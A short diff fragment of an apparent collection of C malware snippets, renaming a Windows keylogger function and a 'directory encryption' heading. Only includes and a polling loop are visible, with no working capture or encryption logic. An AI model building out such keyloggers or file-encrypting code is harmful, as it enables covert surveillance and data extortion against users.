@@ -3,7 +3,7 @@ keylogger:
 #include <stdio.h>
 #include <windows.h>
 //import
-int klog() {
+int keylogg() {
     char key;
     while(1) {
         Sleep(10);
@@ -20,7 +20,7 @@ int klog() {
 }
 ```
 
-directory encryption:
+direncer:
 ```
 #include <stdio.h>
 #include <stdlib.h>
